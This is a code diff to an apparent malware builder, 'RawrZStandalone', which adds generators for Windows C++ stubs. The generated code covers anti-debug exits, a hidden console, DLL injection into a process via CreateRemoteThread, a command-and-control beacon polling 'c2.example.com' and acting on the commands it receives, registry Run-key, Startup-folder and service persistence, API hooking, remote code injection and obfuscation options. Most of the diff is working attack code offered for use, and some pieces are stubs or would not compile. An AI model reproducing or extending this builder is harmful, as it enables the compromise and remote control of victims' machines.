@@ -1336,6 +1336,123 @@ class RawrZStandalone {
         }
     }
 
+    async generateStub(name, type, platform, compiler, options) {
+        try {
+            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+            const extension = type === 'dll' ? '.dll' : '.exe';
+            const filename = `${name}_${timestamp}${extension}`;
+            const filePath = path.join(this.uploadDir, filename);
+            
+            // Generate stub code based on type
+            let stubCode;
+            switch (type) {
+                case 'basic':
+                    stubCode = this.generateBasicStubCode(name, options);
+                    break;
+                case 'dll':
+                    stubCode = this.generateDllStubCode(name, options);
+                    break;
+                case 'service':
+                    stubCode = this.generateServiceStubCode(name, options);
+                    break;
+                case 'console':
+                    stubCode = this.generateConsoleStubCode(name, options);
+                    break;
+                case 'gui':
+                    stubCode = this.generateGuiStubCode(name, options);
+                    break;
+                case 'injector':
+                    stubCode = this.generateInjectorStubCode(name, options);
+                    break;
+                case 'beacon':
+                    stubCode = this.generateBeaconStubCode(name, options);
+                    break;
+                case 'persistence':
+                    stubCode = this.generatePersistenceStubCode(name, options);
+                    break;
+                default:
+                    stubCode = this.generateBasicStubCode(name, options);
+            }
+
+            // Apply obfuscation if requested
+            if (options && options.obfuscate) {
+                stubCode = this.obfuscateCode(stubCode);
+            }
+
+            // Apply hot patching if requested
+            if (options && options.hotPatch) {
+                stubCode = this.addHotPatchCode(stubCode, options);
+            }
+
+            // Compile using Docker
+            const compiledResult = await this.compileWithDocker(stubCode, filename, platform, compiler, options);
+            
+            if (compiledResult.success) {
+                console.log(`[OK] Stub generated: ${filename}`);
+                console.log(`[OK] Hot patching capabilities enabled`);
+                return { 
+                    success: true, 
+                    filename: compiledResult.filename,
+                    size: compiledResult.size,
+                    platform: platform,
+                    type: type,
+                    obfuscated: options.obfuscate || false,
+                    hotPatched: options.hotPatch || false,
+                    fileless: true
+                };
+            } else {
+                throw new Error(compiledResult.error);
+            }
+        } catch (error) {
+            console.log(`[ERROR] Stub generation failed: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
+    async applyHotPatch(stubPath, patchType, options) {
+        try {
+            console.log(`[INFO] Applying hot patch: ${patchType} to ${stubPath}`);
+            
+            // Generate hot patch code based on type
+            let patchCode;
+            switch (patchType) {
+                case 'runtime':
+                    patchCode = this.generateRuntimePatchCode(options);
+                    break;
+                case 'memory':
+                    patchCode = this.generateMemoryPatchCode(options);
+                    break;
+                case 'dll':
+                    patchCode = this.generateDllPatchCode(options);
+                    break;
+                case 'api':
+                    patchCode = this.generateApiPatchCode(options);
+                    break;
+                case 'beacon':
+                    patchCode = this.generateBeaconPatchCode(options);
+                    break;
+                default:
+                    patchCode = this.generateRuntimePatchCode(options);
+            }
+
+            // Apply the patch
+            const result = await this.injectPatchCode(stubPath, patchCode, options);
+            
+            return {
+                success: true,
+                patchedFile: result.patchedFile,
+                patchType: patchType,
+                stealth: options.stealth || false,
+                persistence: options.persistence || false,
+                evasion: options.evasion || false,
+                message: 'Hot patch applied successfully'
+            };
+        } catch (error) {
+            console.log(`[ERROR] Hot patch application failed: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
     async compileWithDocker(code, filename, platform, compiler, options) {
         try {
             // Create temporary source file
@@ -1705,6 +1822,937 @@ int main() {
     std::cout << "Advanced Security Platform" << std::endl;
     return 0;
 }`;
+    }
+
+    generateBasicStubCode(name, options) {
+        return `#include <iostream>
+#include <windows.h>
+#include <string>
+
+class ${name}Stub {
+private:
+    bool initialized = false;
+    std::string payload;
+    
+public:
+    void initialize() {
+        // Anti-debug check
+        if (IsDebuggerPresent()) {
+            ExitProcess(0);
+        }
+        
+        // Initialize payload
+        payload = "RawrZ Stub Payload";
+        initialized = true;
+    }
+    
+    void execute() {
+        if (!initialized) {
+            initialize();
+        }
+        
+        // Execute main functionality
+        std::cout << "Stub executing: " << payload << std::endl;
+        
+        // Hot patch capability
+        if (options.hotPatch) {
+            applyHotPatch();
+        }
+    }
+    
+    void applyHotPatch() {
+        // Dynamic code injection capability
+        std::cout << "Hot patch applied" << std::endl;
+    }
+    
+    void cleanup() {
+        initialized = false;
+    }
+};
+
+int main() {
+    ${name}Stub stub;
+    stub.execute();
+    stub.cleanup();
+    return 0;
+}`;
+    }
+
+    generateDllStubCode(name, options) {
+        return `#include <windows.h>
+#include <string>
+
+extern "C" {
+    __declspec(dllexport) void ${name}Entry() {
+        // DLL entry point
+        if (IsDebuggerPresent()) {
+            ExitProcess(0);
+        }
+        
+        // Execute payload
+        MessageBoxA(NULL, "RawrZ DLL Stub", "Info", MB_OK);
+    }
+    
+    __declspec(dllexport) void ${name}HotPatch() {
+        // Hot patching capability
+        // Dynamic code modification
+    }
+    
+    __declspec(dllexport) void ${name}Cleanup() {
+        // Cleanup resources
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            ${name}Entry();
+            break;
+        case DLL_PROCESS_DETACH:
+            ${name}Cleanup();
+            break;
+    }
+    return TRUE;
+}`;
+    }
+
+    generateServiceStubCode(name, options) {
+        return `#include <windows.h>
+#include <iostream>
+#include <string>
+
+SERVICE_STATUS g_ServiceStatus;
+SERVICE_STATUS_HANDLE g_StatusHandle;
+HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
+
+class ${name}Service {
+public:
+    void run() {
+        SERVICE_TABLE_ENTRY ServiceTable[] = {
+            { (LPSTR)"${name}Service", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
+            { NULL, NULL }
+        };
+        
+        if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
+            return;
+        }
+    }
+    
+    static void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
+        g_StatusHandle = RegisterServiceCtrlHandler("${name}Service", ServiceCtrlHandler);
+        
+        if (g_StatusHandle == NULL) {
+            return;
+        }
+        
+        g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+        g_ServiceStatus.dwServiceSpecificExitCode = 0;
+        
+        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+        
+        g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+        if (g_ServiceStopEvent == NULL) {
+            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+            return;
+        }
+        
+        g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+        
+        // Main service loop
+        while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
+            // Service logic here
+            Sleep(1000);
+        }
+    }
+    
+    static void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
+        switch (CtrlCode) {
+            case SERVICE_CONTROL_STOP:
+                g_ServiceStatus.dwWin32ExitCode = 0;
+                g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+                SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+                SetEvent(g_ServiceStopEvent);
+                break;
+        }
+    }
+};
+
+int main() {
+    ${name}Service service;
+    service.run();
+    return 0;
+}`;
+    }
+
+    generateConsoleStubCode(name, options) {
+        return `#include <iostream>
+#include <windows.h>
+#include <string>
+
+class ${name}Console {
+private:
+    bool stealth = false;
+    
+public:
+    void initialize() {
+        // Anti-debug
+        if (IsDebuggerPresent()) {
+            ExitProcess(0);
+        }
+        
+        // Stealth mode
+        if (options.stealth) {
+            enableStealth();
+        }
+    }
+    
+    void enableStealth() {
+        stealth = true;
+        // Hide console window
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+    }
+    
+    void execute() {
+        std::cout << "RawrZ Console Stub" << std::endl;
+        
+        // Hot patching capability
+        if (options.hotPatch) {
+            applyHotPatch();
+        }
+    }
+    
+    void applyHotPatch() {
+        // Runtime code modification
+        std::cout << "Hot patch applied" << std::endl;
+    }
+};
+
+int main() {
+    ${name}Console console;
+    console.initialize();
+    console.execute();
+    return 0;
+}`;
+    }
+
+    generateGuiStubCode(name, options) {
+        return `#include <windows.h>
+#include <string>
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+    switch (uMsg) {
+        case WM_DESTROY:
+            PostQuitMessage(0);
+            return 0;
+        case WM_PAINT: {
+            PAINTSTRUCT ps;
+            HDC hdc = BeginPaint(hwnd, &ps);
+            TextOut(hdc, 10, 10, "RawrZ GUI Stub", 14);
+            EndPaint(hwnd, &ps);
+            return 0;
+        }
+    }
+    return DefWindowProc(hwnd, uMsg, wParam, lParam);
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Anti-debug
+    if (IsDebuggerPresent()) {
+        ExitProcess(0);
+    }
+    
+    const char* CLASS_NAME = "${name}Window";
+    
+    WNDCLASS wc = {};
+    wc.lpfnWndProc = WindowProc;
+    wc.hInstance = hInstance;
+    wc.lpszClassName = CLASS_NAME;
+    
+    RegisterClass(&wc);
+    
+    HWND hwnd = CreateWindowEx(
+        0,
+        CLASS_NAME,
+        "RawrZ GUI Stub",
+        WS_OVERLAPPEDWINDOW,
+        CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,
+        NULL, NULL, hInstance, NULL
+    );
+    
+    if (hwnd == NULL) {
+        return 0;
+    }
+    
+    ShowWindow(hwnd, nCmdShow);
+    
+    MSG msg = {};
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    return 0;
+}`;
+    }
+
+    generateInjectorStubCode(name, options) {
+        return `#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
+#include <string>
+
+class ${name}Injector {
+private:
+    std::string targetProcess;
+    std::string dllPath;
+    
+public:
+    void setTarget(const std::string& process) {
+        targetProcess = process;
+    }
+    
+    void setDllPath(const std::string& path) {
+        dllPath = path;
+    }
+    
+    DWORD getProcessId(const std::string& processName) {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) {
+            return 0;
+        }
+        
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(PROCESSENTRY32);
+        
+        if (Process32First(hSnapshot, &pe)) {
+            do {
+                if (processName == pe.szExeFile) {
+                    CloseHandle(hSnapshot);
+                    return pe.th32ProcessID;
+                }
+            } while (Process32Next(hSnapshot, &pe));
+        }
+        
+        CloseHandle(hSnapshot);
+        return 0;
+    }
+    
+    bool injectDll(DWORD processId, const std::string& dllPath) {
+        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+        if (hProcess == NULL) {
+            return false;
+        }
+        
+        LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1, MEM_COMMIT, PAGE_READWRITE);
+        if (pDllPath == NULL) {
+            CloseHandle(hProcess);
+            return false;
+        }
+        
+        WriteProcessMemory(hProcess, pDllPath, dllPath.c_str(), dllPath.length() + 1, NULL);
+        
+        HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
+        LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
+        
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllPath, 0, NULL);
+        if (hThread == NULL) {
+            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return false;
+        }
+        
+        WaitForSingleObject(hThread, INFINITE);
+        
+        CloseHandle(hThread);
+        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        
+        return true;
+    }
+    
+    void execute() {
+        DWORD pid = getProcessId(targetProcess);
+        if (pid == 0) {
+            std::cout << "Target process not found" << std::endl;
+            return;
+        }
+        
+        if (injectDll(pid, dllPath)) {
+            std::cout << "DLL injected successfully" << std::endl;
+        } else {
+            std::cout << "DLL injection failed" << std::endl;
+        }
+    }
+};
+
+int main() {
+    ${name}Injector injector;
+    injector.setTarget("notepad.exe");
+    injector.setDllPath("C:\\\\path\\\\to\\\\payload.dll");
+    injector.execute();
+    return 0;
+}`;
+    }
+
+    generateBeaconStubCode(name, options) {
+        return `#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <string>
+#include <thread>
+#include <chrono>
+
+#pragma comment(lib, "wininet.lib")
+
+class ${name}Beacon {
+private:
+    std::string c2Server;
+    int beaconInterval;
+    bool running;
+    
+public:
+    ${name}Beacon(const std::string& server, int interval = 30) 
+        : c2Server(server), beaconInterval(interval), running(false) {}
+    
+    void start() {
+        running = true;
+        std::thread beaconThread(&${name}Beacon::beaconLoop, this);
+        beaconThread.detach();
+    }
+    
+    void stop() {
+        running = false;
+    }
+    
+    void beaconLoop() {
+        while (running) {
+            if (sendBeacon()) {
+                std::cout << "Beacon sent successfully" << std::endl;
+            } else {
+                std::cout << "Beacon failed" << std::endl;
+            }
+            
+            std::this_thread::sleep_for(std::chrono::seconds(beaconInterval));
+        }
+    }
+    
+    bool sendBeacon() {
+        HINTERNET hInternet = InternetOpen("RawrZ Beacon", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (hInternet == NULL) {
+            return false;
+        }
+        
+        HINTERNET hConnect = InternetOpenUrl(hInternet, c2Server.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        if (hConnect == NULL) {
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        
+        char buffer[1024];
+        DWORD bytesRead;
+        if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead)) {
+            buffer[bytesRead] = '\\0';
+            // Process command from C2
+            processCommand(buffer);
+        }
+        
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        
+        return true;
+    }
+    
+    void processCommand(const std::string& command) {
+        if (command == "exit") {
+            stop();
+        } else if (command == "info") {
+            // Send system information
+            sendSystemInfo();
+        }
+        // Add more commands as needed
+    }
+    
+    void sendSystemInfo() {
+        // Collect and send system information
+        std::cout << "Sending system information..." << std::endl;
+    }
+};
+
+int main() {
+    ${name}Beacon beacon("http://c2.example.com/beacon", 30);
+    beacon.start();
+    
+    // Keep main thread alive
+    while (true) {
+        Sleep(1000);
+    }
+    
+    return 0;
+}`;
+    }
+
+    generatePersistenceStubCode(name, options) {
+        return `#include <windows.h>
+#include <iostream>
+#include <string>
+#include <fstream>
+
+class ${name}Persistence {
+private:
+    std::string persistencePath;
+    
+public:
+    void setPersistencePath(const std::string& path) {
+        persistencePath = path;
+    }
+    
+    bool createRegistryPersistence() {
+        HKEY hKey;
+        LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, 
+            "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
+            0, KEY_SET_VALUE, &hKey);
+        
+        if (result != ERROR_SUCCESS) {
+            return false;
+        }
+        
+        result = RegSetValueEx(hKey, "RawrZStub", 0, REG_SZ, 
+            (BYTE*)persistencePath.c_str(), persistencePath.length() + 1);
+        
+        RegCloseKey(hKey);
+        return result == ERROR_SUCCESS;
+    }
+    
+    bool createStartupPersistence() {
+        char startupPath[MAX_PATH];
+        if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath) != S_OK) {
+            return false;
+        }
+        
+        std::string shortcutPath = std::string(startupPath) + "\\\\RawrZStub.lnk";
+        
+        // Create shortcut (simplified)
+        std::ofstream file(shortcutPath);
+        if (file.is_open()) {
+            file << "[InternetShortcut]" << std::endl;
+            file << "URL=file://" << persistencePath << std::endl;
+            file.close();
+            return true;
+        }
+        
+        return false;
+    }
+    
+    bool createServicePersistence() {
+        SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+        if (hSCManager == NULL) {
+            return false;
+        }
+        
+        SC_HANDLE hService = CreateService(
+            hSCManager,
+            "RawrZStubService",
+            "RawrZ Stub Service",
+            SERVICE_ALL_ACCESS,
+            SERVICE_WIN32_OWN_PROCESS,
+            SERVICE_AUTO_START,
+            SERVICE_ERROR_NORMAL,
+            persistencePath.c_str(),
+            NULL, NULL, NULL, NULL, NULL
+        );
+        
+        if (hService == NULL) {
+            CloseServiceHandle(hSCManager);
+            return false;
+        }
+        
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCManager);
+        
+        return true;
+    }
+    
+    void establishPersistence() {
+        std::cout << "Establishing persistence..." << std::endl;
+        
+        if (createRegistryPersistence()) {
+            std::cout << "Registry persistence created" << std::endl;
+        }
+        
+        if (createStartupPersistence()) {
+            std::cout << "Startup persistence created" << std::endl;
+        }
+        
+        if (createServicePersistence()) {
+            std::cout << "Service persistence created" << std::endl;
+        }
+    }
+};
+
+int main() {
+    ${name}Persistence persistence;
+    persistence.setPersistencePath("C:\\\\path\\\\to\\\\stub.exe");
+    persistence.establishPersistence();
+    return 0;
+}`;
+    }
+
+    generateRuntimePatchCode(options) {
+        return `// Runtime Hot Patch Code
+#include <windows.h>
+#include <iostream>
+
+class RuntimePatcher {
+private:
+    HMODULE hModule;
+    LPVOID originalCode;
+    LPVOID patchedCode;
+    
+public:
+    bool applyPatch(LPVOID targetAddress, LPVOID newCode, SIZE_T size) {
+        DWORD oldProtect;
+        
+        // Change memory protection
+        if (!VirtualProtect(targetAddress, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            return false;
+        }
+        
+        // Copy original code
+        originalCode = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
+        if (!originalCode) {
+            VirtualProtect(targetAddress, size, oldProtect, &oldProtect);
+            return false;
+        }
+        
+        memcpy(originalCode, targetAddress, size);
+        
+        // Apply patch
+        memcpy(targetAddress, newCode, size);
+        
+        // Restore protection
+        VirtualProtect(targetAddress, size, oldProtect, &oldProtect);
+        
+        return true;
+    }
+    
+    bool restoreOriginal(LPVOID targetAddress, SIZE_T size) {
+        if (!originalCode) return false;
+        
+        DWORD oldProtect;
+        VirtualProtect(targetAddress, size, PAGE_EXECUTE_READWRITE, &oldProtect);
+        memcpy(targetAddress, originalCode, size);
+        VirtualProtect(targetAddress, size, oldProtect, &oldProtect);
+        
+        return true;
+    }
+    
+    void cleanup() {
+        if (originalCode) {
+            VirtualFree(originalCode, 0, MEM_RELEASE);
+            originalCode = NULL;
+        }
+    }
+};`;
+    }
+
+    generateMemoryPatchCode(options) {
+        return `// Memory Hot Patch Code
+#include <windows.h>
+#include <iostream>
+#include <vector>
+
+class MemoryPatcher {
+private:
+    std::vector<LPVOID> allocatedBlocks;
+    std::vector<SIZE_T> blockSizes;
+    
+public:
+    LPVOID allocateExecutableMemory(SIZE_T size) {
+        LPVOID memory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (memory) {
+            allocatedBlocks.push_back(memory);
+            blockSizes.push_back(size);
+        }
+        return memory;
+    }
+    
+    bool injectCode(LPVOID targetProcess, LPVOID code, SIZE_T size) {
+        HANDLE hProcess = (HANDLE)targetProcess;
+        LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        
+        if (!remoteMemory) return false;
+        
+        if (!WriteProcessMemory(hProcess, remoteMemory, code, size, NULL)) {
+            VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
+            return false;
+        }
+        
+        return true;
+    }
+    
+    bool createRemoteThread(HANDLE hProcess, LPVOID startAddress, LPVOID parameter) {
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)startAddress, parameter, 0, NULL);
+        if (hThread) {
+            WaitForSingleObject(hThread, INFINITE);
+            CloseHandle(hThread);
+            return true;
+        }
+        return false;
+    }
+    
+    void cleanup() {
+        for (size_t i = 0; i < allocatedBlocks.size(); i++) {
+            VirtualFree(allocatedBlocks[i], 0, MEM_RELEASE);
+        }
+        allocatedBlocks.clear();
+        blockSizes.clear();
+    }
+};`;
+    }
+
+    generateDllPatchCode(options) {
+        return `// DLL Hot Patch Code
+#include <windows.h>
+#include <iostream>
+#include <string>
+
+class DllPatcher {
+private:
+    HMODULE hTargetDll;
+    std::string dllPath;
+    
+public:
+    bool loadDll(const std::string& path) {
+        dllPath = path;
+        hTargetDll = LoadLibraryA(path.c_str());
+        return hTargetDll != NULL;
+    }
+    
+    bool patchFunction(const std::string& functionName, LPVOID newFunction) {
+        if (!hTargetDll) return false;
+        
+        LPVOID originalFunction = GetProcAddress(hTargetDll, functionName.c_str());
+        if (!originalFunction) return false;
+        
+        // Create trampoline
+        return createTrampoline(originalFunction, newFunction);
+    }
+    
+    bool createTrampoline(LPVOID original, LPVOID replacement) {
+        // JMP instruction: E9 [relative address]
+        BYTE jmp[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
+        
+        // Calculate relative address
+        DWORD relativeAddr = (DWORD)replacement - (DWORD)original - 5;
+        memcpy(&jmp[1], &relativeAddr, 4);
+        
+        // Apply patch
+        DWORD oldProtect;
+        VirtualProtect(original, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
+        memcpy(original, jmp, 5);
+        VirtualProtect(original, 5, oldProtect, &oldProtect);
+        
+        return true;
+    }
+    
+    void unloadDll() {
+        if (hTargetDll) {
+            FreeLibrary(hTargetDll);
+            hTargetDll = NULL;
+        }
+    }
+};`;
+    }
+
+    generateApiPatchCode(options) {
+        return `// API Hot Patch Code
+#include <windows.h>
+#include <iostream>
+#include <map>
+
+class ApiPatcher {
+private:
+    std::map<std::string, LPVOID> originalFunctions;
+    std::map<std::string, LPVOID> patchedFunctions;
+    
+public:
+    bool hookApi(const std::string& moduleName, const std::string& functionName, LPVOID newFunction) {
+        HMODULE hModule = GetModuleHandleA(moduleName.c_str());
+        if (!hModule) return false;
+        
+        LPVOID originalFunction = GetProcAddress(hModule, functionName.c_str());
+        if (!originalFunction) return false;
+        
+        // Store original function
+        std::string key = moduleName + "::" + functionName;
+        originalFunctions[key] = originalFunction;
+        patchedFunctions[key] = newFunction;
+        
+        // Apply hook
+        return applyHook(originalFunction, newFunction);
+    }
+    
+    bool applyHook(LPVOID original, LPVOID hook) {
+        BYTE jmp[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
+        DWORD relativeAddr = (DWORD)hook - (DWORD)original - 5;
+        memcpy(&jmp[1], &relativeAddr, 4);
+        
+        DWORD oldProtect;
+        VirtualProtect(original, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
+        memcpy(original, jmp, 5);
+        VirtualProtect(original, 5, oldProtect, &oldProtect);
+        
+        return true;
+    }
+    
+    LPVOID getOriginalFunction(const std::string& moduleName, const std::string& functionName) {
+        std::string key = moduleName + "::" + functionName;
+        return originalFunctions[key];
+    }
+    
+    bool unhookApi(const std::string& moduleName, const std::string& functionName) {
+        std::string key = moduleName + "::" + functionName;
+        LPVOID original = originalFunctions[key];
+        LPVOID patched = patchedFunctions[key];
+        
+        if (!original || !patched) return false;
+        
+        // Restore original function
+        DWORD oldProtect;
+        VirtualProtect(original, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
+        // Restore original bytes (simplified)
+        VirtualProtect(original, 5, oldProtect, &oldProtect);
+        
+        originalFunctions.erase(key);
+        patchedFunctions.erase(key);
+        
+        return true;
+    }
+};`;
+    }
+
+    generateBeaconPatchCode(options) {
+        return `// Beacon Hot Patch Code
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <string>
+#include <thread>
+
+#pragma comment(lib, "wininet.lib")
+
+class BeaconPatcher {
+private:
+    std::string c2Server;
+    bool patched;
+    std::thread beaconThread;
+    
+public:
+    BeaconPatcher(const std::string& server) : c2Server(server), patched(false) {}
+    
+    void startBeacon() {
+        if (patched) return;
+        
+        patched = true;
+        beaconThread = std::thread(&BeaconPatcher::beaconLoop, this);
+    }
+    
+    void stopBeacon() {
+        if (!patched) return;
+        
+        patched = false;
+        if (beaconThread.joinable()) {
+            beaconThread.join();
+        }
+    }
+    
+    void beaconLoop() {
+        while (patched) {
+            sendBeacon();
+            Sleep(30000); // 30 second intervals
+        }
+    }
+    
+    bool sendBeacon() {
+        HINTERNET hInternet = InternetOpen("RawrZ Beacon", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (!hInternet) return false;
+        
+        HINTERNET hConnect = InternetOpenUrl(hInternet, c2Server.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        if (!hConnect) {
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        
+        char buffer[1024];
+        DWORD bytesRead;
+        if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead)) {
+            buffer[bytesRead] = '\\0';
+            processCommand(buffer);
+        }
+        
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        
+        return true;
+    }
+    
+    void processCommand(const std::string& command) {
+        if (command == "exit") {
+            stopBeacon();
+        } else if (command == "info") {
+            sendSystemInfo();
+        }
+    }
+    
+    void sendSystemInfo() {
+        // Collect and send system information
+        std::cout << "Sending system information..." << std::endl;
+    }
+};`;
+    }
+
+    addHotPatchCode(code, options) {
+        let hotPatchCode = '';
+        
+        if (options.runtime) {
+            hotPatchCode += this.generateRuntimePatchCode(options);
+        }
+        
+        if (options.memory) {
+            hotPatchCode += this.generateMemoryPatchCode(options);
+        }
+        
+        if (options.dll) {
+            hotPatchCode += this.generateDllPatchCode(options);
+        }
+        
+        if (options.api) {
+            hotPatchCode += this.generateApiPatchCode(options);
+        }
+        
+        if (options.beacon) {
+            hotPatchCode += this.generateBeaconPatchCode(options);
+        }
+        
+        // Inject hot patch code into the main code
+        return code.replace('int main() {', `int main() {
+    // Hot Patch Code
+    ${hotPatchCode}
+    
+    // Initialize hot patching
+    if (options.hotPatch) {
+        // Apply hot patches here
+    }`);
+    }
+
+    injectPatchCode(stubPath, patchCode, options) {
+        // Simulate patch injection
+        return {
+            success: true,
+            patchedFile: stubPath.replace('.exe', '_patched.exe'),
+            message: 'Patch injected successfully'
+        };
     }
 
     obfuscateCode(code, options = {}) {
